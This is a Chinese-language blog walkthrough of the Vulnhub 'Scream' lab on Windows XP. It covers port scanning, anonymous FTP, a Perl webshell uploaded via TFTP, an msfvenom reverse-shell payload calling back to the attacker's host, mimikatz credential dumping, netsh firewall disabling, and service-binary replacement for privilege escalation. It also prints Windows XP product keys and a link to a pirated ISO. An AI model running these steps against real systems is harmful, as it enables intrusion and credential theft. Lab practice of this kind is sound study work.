---
title: SCREAM
date: 2024-02-20  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Scream.html"
---

# SCREAM

![image-20240216081944493](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143920.png)

## 生成靶场

今天挑战的靶场有点与众不同：

![image-20240216082018318](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143922.png)

他要自己生成一个iso文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143924.png" alt="image-20240216082057815" style="zoom: 50%;" />

作者是将漏洞直接插入iso的，所以我们需要提前准备一个`winxp sp2/sp3`的iso文件：

`ed2k://|file|sc_win_xp_pro_with_sp2_vl.iso|621346816|6F27DB53806D79FE37A0EDEC04AA9B05|/`

使用腾讯微云可以很方便的下载，不用vip：

![image-20240216091407398](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143925.png)

但是下载到本地的时候太慢了。。。。。。

一边装了个pwn系统，一边等好了，漫长。。。输入产品认证码和地址：

![image-20240216152121509](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143926.png)

等待加载出镜像：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143927.png" alt="image-20240216152213781" style="zoom:50%;" />

建立虚拟机，打开看一下，出现了奇奇怪怪的问题，后来听大佬说得用英文版的，也就是en开头的：

可以在这里下载：[en_windows_xp_professional_with_service_pack_3_x86_cd_vl_x14-73974.iso ](https://archive.org/download/windows-xp-all-sp-msdn-iso-files-en-de-ru-tr-x86-x64/en_windows_xp_professional_with_service_pack_3_x86_cd_vl_x14-73974.iso)

![image-20240216221708205](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143928.png)

开启虚拟机的过程中，用户名不能使用默认的`Administrator`，需要改一下。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143929.png" alt="image-20240216222355650" style="zoom: 67%;" />

然后莫名其妙就关机了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143930.png" alt="image-20240216222507498" style="zoom: 67%;" />

嘶。。。。等待重启一下吧，我突然想起来之前有个中文的好像也重启了，嘶。。。是不是当时也可以用的来着。。

然后就到了选用户的时候了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143931.png" alt="image-20240216222615962" style="zoom:67%;" />

发送`ctrl+alt+del`就行了，发两次：

![image-20240216222859321](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143932.png)

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143933.png" alt="image-20240216223506049" style="zoom:67%;" />

登不进去，扫一下：

![image-20240216223244237](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402162232594.png)

看一下是否是这个：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143934.png" alt="image-20240216223347699" style="zoom:50%;" />

看来我们要搞的就是这台机子了！

## 信息搜集

### 端口扫描（少个80端口）

```bash
sudo nmap -sS -sV -p- -sC 192.168.244.183
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 09:50 EST
# Nmap scan report for 192.168.244.183
# Host is up (0.00058s latency).
# Not shown: 65532 filtered tcp ports (no-response)
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
# |_ftp-bounce: bounce working!
# | ftp-syst: 
# |_  SYST: UNIX emulated by FileZilla
# | ftp-anon: Anonymous FTP login allowed (FTP code 230)
# | drwxr-xr-x 1 ftp ftp              0 Feb 16 22:24 bin
# | drwxr-xr-x 1 ftp ftp              0 Feb 16 22:24 log
# |_drwxr-xr-x 1 ftp ftp              0 Feb 16 22:24 root
# 22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
# | ssh-hostkey: 
# |   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
# |_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
# 23/tcp open  telnet
# | fingerprint-strings: 
# |   GenericLines, NCP, RPCCheck, tn3270: 
# |     Scream Telnet Service
# |     login:
# |   GetRequest: 
# |     HTTP/1.0
# |     Scream Telnet Service
# |     login:
# |   Help: 
# |     HELP
# |     Scream Telnet Service
# |     login:
# |   SIPOptions: 
# |     OPTIONS sip:nm SIP/2.0
# |     Via: SIP/2.0/TCP nm;branch=foo
# |     From: <sip:nm@nm>;tag=root
# |     <sip:nm2@nm2>
# |     Call-ID: 50000
# |     CSeq: 42 OPTIONS
# |     Max-Forwards: 70
# |     Content-Length: 0
# |     Contact: <sip:nm@nm>
# |     Accept: application/sdp
# |     Scream Telnet Service
# |_    login:
# 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
# SF-Port23-TCP:V=7.94SVN%I=7%D=2/16%Time=65CF7691%P=x86_64-pc-linux-gnu%r(N
# SF:ULL,12,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xf
# SF:d\x1f")%r(GenericLines,34,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03
# SF:\xff\xfd\x18\xff\xfd\x1f\r\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x
# SF:20")%r(tn3270,3C,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\
# SF:x18\xff\xfd\x1f\xff\xfc\x18\xff\xfe\x19\xff\xfc\x19\xff\xfb\0Scream\x20
# SF:Telnet\x20Service\r\nlogin:\x20")%r(GetRequest,42,"\xff\xfb\x01\xff\xfe
# SF:\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1fGET\x20/\x20HTTP/1\.0\r
# SF:\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(RPCCheck,5C,"\xff\x
# SF:fb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x80\0\0\
# SF:(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\
# SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0Scream\x20Telnet\x20Service\r\nlogin:\x20")%
# SF:r(Help,36,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff
# SF:\xfd\x1fHELP\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(SIPOption
# SF:s,10F,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd
# SF:\x1fOPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20nm;branch=
# SF:foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r\nCall-ID
# SF::\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\nContent-
# SF:Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20application/sdp\r
# SF:\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(NCP,31,"\xff\xfb\x0
# SF:1\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x13Scream\x20
# SF:Telnet\x20Service\r\nlogin:\x20");
# MAC Address: 00:0C:29:4C:10:1E (VMware)
# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

# Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 157.70 seconds
```

嘶，看师傅们wp发现有个80没扫出来。。。。是启动错误了吗？就离谱，重新搞一个试试，再试试那个中文吧：

### 换中文的扫描试试

```text
# sc_win_xp_pro_with_sp2_vl.iso
B66VY-4D94T-TPPD4-43F72-8X4FY
```

现在就卡在这一步了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143935.png" alt="image-20240216234112489" style="zoom:67%;" />

离谱，还是换回来吧，重启不了服务的话我只能换镜像了，麻了！这次尝试不自动安装：

```text
MRX3F-47B9T-2487J-KWKMF-RPWBY
```

这次很顺利，连用户名都不用改，看来还是不能靠它自动安装！我擦，进来了，爽！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143936.png" alt="image-20240217000856085" style="zoom: 67%;" />

### 端口扫描

![image-20240217001421574](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143937.png)

后台偷偷摸摸扫一下试试：

```bash
sudo arp-scan -l
sudo rustscan -a 192.168.244.183 -- -A -sCV -Pn
```

扫描结果如下：

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.244.183:21
Open 192.168.244.183:22
Open 192.168.244.183:23
Open 192.168.244.183:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-16 11:19 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:19
Completed NSE at 11:19, 0.00s elapsed
Initiating ARP Ping Scan at 11:19
Scanning 192.168.244.183 [1 port]
Completed ARP Ping Scan at 11:19, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:19
Completed Parallel DNS resolution of 1 host. at 11:19, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:19
Scanning 192.168.244.183 [4 ports]
Discovered open port 23/tcp on 192.168.244.183
Discovered open port 21/tcp on 192.168.244.183
Discovered open port 22/tcp on 192.168.244.183
Discovered open port 80/tcp on 192.168.244.183
Completed SYN Stealth Scan at 11:19, 0.02s elapsed (4 total ports)
Initiating Service scan at 11:19
Scanning 4 services on 192.168.244.183
Completed Service scan at 11:20, 46.05s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.244.183
Retrying OS detection (try #2) against 192.168.244.183
NSE: Script scanning 192.168.244.183.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 5.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.02s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Nmap scan report for 192.168.244.183
Host is up, received arp-response (0.00061s latency).
Scanned at 2024-02-16 11:19:41 EST for 55s

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 128 WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Feb 17 00:06 bin
| drwxr-xr-x 1 ftp ftp              0 Feb 17 00:06 log
|_drwxr-xr-x 1 ftp ftp              0 Feb 17 00:06 root
|_ftp-bounce: bounce working!
22/tcp open  ssh     syn-ack ttl 128 WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAPtvfmQ8cYhT1xTUjk5200EXVr+bRcTtGNR4rO/Lvu/Vqg/bVeh5s9jVC71rtZUKo7JgO69m2mC3tTotkfmAxiITLfjWh4oser26g7JxcNZBpwdLVbfT1nv97z04v6IiKW8wEWtMh1bIJPjvmVPAZ014VwBnAAciMyhOwDMEZpIXAAAAFQDyUkmh2IGAv+mFXyCBioERkTgalQAAAIBIFC7tXS5HM9kNh+rSNEn69CwsC8JM+oScNih2xJBDDdDkjdUQaan29p0+Xypa4xlxfLisYLmWgoN8ckRjclehgvRMub498VtWtrJVeNohpuy/I01M+knr6WjhAM7bQ6FwZZnFuP9tjOOr88f62Y/cOyyNZdVx0GW+beAMHRkmEAAAAIEA4nZJdLgvGEV7kw+V36+ABpbk43fg/SoqXnDqBrrNoMLVQIioJQCN8SJpYvI/9XeWT2wvQ9+2EGp2JA+RIihP1+OiLlVKFPqleTGQz4sBeHKl+erAqhBlpdWG29X8qkMGHdlCUtCvUkK/DFuFsllx3RUSqeEJEuZ9n2bjiDFDmP0=
|   1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEAs4A0SjxI4hCfOqCoOQlHePoEzc7jnMryJ2l+VytIUIzl4CtZWDl+QksfXMeh3qJLRCGluu+FYsxbkWQMEzaw77tD9nhVyV7q+9vDDi5SvKon9NppKMmTTNxZK69qLVzKYnXuazBPIrUG1HfNaCr/1jSyTNEMWt4kngdfLpewoMM=
23/tcp open  telnet  syn-ack ttl 128
| fingerprint-strings: 
|   GenericLines, NCP, RPCCheck, tn3270: 
|     Scream Telnet Service
|     login:
|   GetRequest: 
|     HTTP/1.0
|     Scream Telnet Service
|     login:
|   Help: 
|     HELP
|     Scream Telnet Service
|     login:
|   SIPOptions: 
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     Scream Telnet Service
|_    login:
80/tcp open  http    syn-ack ttl 128 Tinyweb httpd 1.93
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: TinyWeb/1.93
|_http-title: The Scream - Edvard Munch
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94SVN%I=7%D=2/16%Time=65CF8B23%P=x86_64-pc-linux-gnu%r(N
SF:ULL,12,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xf
SF:d\x1f")%r(GenericLines,34,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03
SF:\xff\xfd\x18\xff\xfd\x1f\r\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x
SF:20")%r(tn3270,3C,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\
SF:x18\xff\xfd\x1f\xff\xfc\x18\xff\xfe\x19\xff\xfc\x19\xff\xfb\0Scream\x20
SF:Telnet\x20Service\r\nlogin:\x20")%r(GetRequest,42,"\xff\xfb\x01\xff\xfe
SF:\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1fGET\x20/\x20HTTP/1\.0\r
SF:\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(RPCCheck,5C,"\xff\x
SF:fb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x80\0\0\
SF:(r\xfe\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0Scream\x20Telnet\x20Service\r\nlogin:\x20")%
SF:r(Help,36,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff
SF:\xfd\x1fHELP\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(SIPOption
SF:s,10F,"\xff\xfb\x01\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd
SF:\x1fOPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20nm;branch=
SF:foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r\nCall-ID
SF::\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\r\nContent-
SF:Length:\x200\r\nContact:\x20<sip:nm@nm>\r\nAccept:\x20application/sdp\r
SF:\n\r\nScream\x20Telnet\x20Service\r\nlogin:\x20")%r(NCP,31,"\xff\xfb\x0
SF:1\xff\xfe\"\xff\xfe\0\xff\xfd\x03\xff\xfd\x18\xff\xfd\x1f\x13Scream\x20
SF:Telnet\x20Service\r\nlogin:\x20");
MAC Address: 00:0C:29:4C:10:1E (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2000|XP|2003 (93%)
OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (93%), Microsoft Windows XP SP2 (93%), Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows XP SP3 (91%), Microsoft Windows 2000 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows 2000 SP0 (87%), Microsoft Windows XP SP2 or Windows Server 2003 (87%), Microsoft Windows Server 2003 (87%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=2/16%OT=21%CT=%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=65CF8B54%P=x86_64-pc-linux-gnu)
SEQ(SP=107%GCD=1%ISR=108%TI=I%TS=0)
OPS(O1=M5B4NW0NNT00NNS%O2=M5B4NW0NNT00NNS%O3=M5B4NW0NNT00%O4=M5B4NW0NNT00NNS%O5=M5B4NW0NNT00NNS%O6=M5B4NNT00NNS)
WIN(W1=4470%W2=41A0%W3=4100%W4=40E8%W5=40E8%W6=402E)
ECN(R=Y%DF=Y%TG=80%W=4470%O=M5B4NW0NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=N)

Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.61 ms 192.168.244.183

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:20
Completed NSE at 11:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.75 seconds
           Raw packets sent: 85 (8.764KB) | Rcvd: 21 (1.140KB)

```

正常了，可以扫到web服务了！！！

### 目录扫描

```bash
feroxbuster -u http://192.168.244.183
# 结果太长了
dirsearch -u http://192.168.244.183 -e* -i 200,300-399
```

![image-20240218091958508](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143938.png)

### 浏览器插件查看

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143939.png" alt="image-20240217002514044" style="zoom:50%;" />

感觉进入点应该不是这里，但是也可以试试`lighttpd`的漏洞，查看一下：

### Nikto扫描

```shell
sudo nikto -h http://192.168.244.183
# - Nikto v2.5.0
# ---------------------------------------------------------------------------
# + Target IP:          192.168.244.183
# + Target Hostname:    192.168.244.183
# + Target Port:        80
# + Start Time:         2024-02-16 21:14:39 (GMT-5)
# ---------------------------------------------------------------------------
# + Server: TinyWeb/1.93
# + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
# + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
# + ERROR: Error limit (20) reached for host, giving up. Last error: 
# + Scan terminated: 0 error(s) and 2 item(s) reported on remote host
# + End Time:           2024-02-16 21:15:16 (GMT-5) (37 seconds)
# ---------------------------------------------------------------------------
# + 1 host(s) tested
```

## 漏洞利用

### 21、69端口

#### 寻找相关漏洞

开启了`ftp`服务，尝试登录一下，看看弱密码可不可以进去：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143940.png" alt="image-20240217102215437" style="zoom:50%;" />

看来不行，信息搜集的时候看到这个`FTP`似乎是`WAR-FTPD 1.65`，可以尝试看看有没有漏洞：

![image-20240217102404937](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143941.png)

似乎都比较老的了，再看下有没有信息漏掉了，发现扫描记录有一条`ftp-anon: Anonymous FTP login allowed`

试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143942.png" alt="image-20240217225345412" style="zoom:50%;" />

成功！！！没发现啥，只看到一个`OpenTFTPServerMT.log`，标志着可能开启了TFTP服务，连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143943.png" alt="image-20240218092226731" style="zoom:50%;" />

既然有服务，咋没扫到，可能是UDP服务：

```shell
nmap -sU -sS -p- --min-rate 5000 192.168.244.183
# Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-18 06:52 EST
# Nmap scan report for 192.168.244.183
# Host is up (0.00064s latency).
# Not shown: 65534 open|filtered udp ports (no-response), 65531 filtered tcp ports (no-response)
# PORT   STATE SERVICE
# 21/tcp open  ftp
# 22/tcp open  ssh
# 23/tcp open  telnet
# 80/tcp open  http
# 69/udp open  tftp
# MAC Address: 00:0C:29:4C:10:1E (VMware)

# Nmap done: 1 IP address (1 host up) scanned in 53.09 seconds
```

OK，尝试上传shell，一开始传不上去，关闭防火墙以后就可以了：

```bash
sudo ufw status
sudo ufw disable
# sudo ufw enable
```

![image-20240218201051552](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143944.png)

尝试get，但是权限不够，传一个`pl的webshell`进去：https://github.com/tennc/webshell/blob/master/pl/WebShell.cgi.pl

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143945.png" alt="image-20240218223842300" style="zoom:50%;" />

去瞅瞅：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143946.png" alt="image-20240218224023632" style="zoom:50%;" />

![image-20240218224114313](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143947.png)

怎么肥事，找不到文件？换一个试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143948.png" alt="image-20240218225036087" style="zoom:50%;" />

![image-20240218225237464](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143949.png)

一样。。。。。神魔个情况。。。。

才发现传参的时候用错了，是问号，我是sb。。。

```bash
tftp> put perlweb_shell.pl /cgi-bin/webshell1.pl 
```

```powershell
dir
```

![image-20240218235206730](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143950.png)

```powershell
echo %username%
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143951.png" alt="image-20240219000109907" style="zoom:50%;" />

```powershell
hostname
net user
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143952.png" alt="image-20240219000202514" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143953.png" alt="image-20240219000314733" style="zoom:50%;" />

```powershell
systeminfo
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143954.png" alt="image-20240219000717750" style="zoom:50%;" />

```bash
qwinsta
```

![image-20240219001112881](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143955.png)

```powershell
net user alex
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143956.png" alt="image-20240219001311337" style="zoom:50%;" />

```powershell
cd C:\
dir
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143957.png" alt="image-20240219001521952" style="zoom:50%;" />

#### 尝试连接上去

先用`msfvenom`生成一个shell，再传到tftp上去：

```bash
msfvenom -l
msfvenom -l payloads windows
msfvenom -l payloads windows reverse
msfvenom -l payloads windows reverse | grep shell
msfvenom -p windows/shell_reverse_tcp
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.244.133 LPORT=1234 -f exe -o webshell.exe
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# No encoder specified, outputting raw payload
# Payload size: 324 bytes
# Final size of exe file: 73802 bytes
# Saved as: webshell.exe
```

![image-20240220003008816](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143958.png)

忘了改模式了，不改模式执行不了这个文件！

![image-20240220003156175](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143959.png)

然后访问一下，设置监听，看看连不连的上：

![image-20240220004920266](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143960.png)

本来没连上的，准备删掉了，突然又连上了。好家伙。。。。

### 22端口

这个端口是运行ssh服务的，按理说是可以试试searchsploit漏洞，看看能不能利用的，但是我没有利用成功，csdn上有个师傅好像是这么做的，不知道详细过程是咋整的，回头有机会可以研究下。

### 23端口

没啥发现欸

## 提权

### mimikatz.exe查询密码

上传一个`mimikatz.exe`:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143961.png" alt="image-20240219003524922" style="zoom:50%;" />

```powershell
cd C:\www\root\cgi-bin
dir
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143962.png" alt="image-20240219003640228" style="zoom:50%;" />

运行一下，发现没有改成二进制文件，重新上传：

![image-20240220005307164](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143963.png)

获取密码：

```shell
# mimikatz shell
privilege::debug
sekurlsa::logonpasswords
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143964.png" alt="image-20240220005408002" style="zoom: 33%;" />

尝试登录，传入两次`ctrl+alt+del`即可进行登录，之前还可以的来着，咋现在不行了。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143965.png" alt="image-20240220010320345" style="zoom:50%;" />

连不了拉倒，应该是对的！

### 尝试关闭防火墙

```shell
netsh firewall set opmode mode=DISABLE
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143966.png" alt="image-20240220012136683" style="zoom:50%;" />

重新扫描一下，看看有没有新发现：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143967.png" alt="image-20240220012456602" style="zoom:50%;" />

没有啥发现，主机重启而且shell断掉了，重新连接一下，关闭一下防火墙：

```shell
netsh firewall show state
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402200143968.png" alt="image-20240220013252751" style="zoom: 50%;" />

一关防火墙就会重启，不知道咋回事。。。

暂时这个办法行不通了，但是我看到有个师傅是这么做的，他关闭这个防火墙以后会暴露出445端口，然后可以利用永恒之蓝漏洞进入。

#### 替换同名文件

看到有的师傅是这样做的：

```shell
C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP Server"
net stop "FileZilla Server FTP Server"
The FileZilla Server FTP server service is stopping.
The FileZilla Server FTP server service was stopped successfully.

C:\Program Files\FileZilla Server>move "FileZilla server.exe" "FileZilla server.exe.bak"
move "FileZilla server.exe" "FileZilla server.exe.bak"

C:\PROGRA~1\FILEZI~1>move C:\www\root\shell.exe "FileZilla server.exe"
move C:\www\root\shell.exe "FileZilla server.exe"

C:\PROGRA~1\FILEZI~1>net start "FileZilla Server FTP Server"
net start "FileZilla Server FTP Server"
```

## 参考

https://blog.csdn.net/qq_38005854/article/details/105789265

https://devloop.users.sourceforge.net/index.php?article75/solution-du-ctf-scream

https://ratiros01.medium.com/vulnhub-dev-random-scream-41bbbb0200e9

https://rastating.github.io/dev-random-scream-ctf-walkthrough/

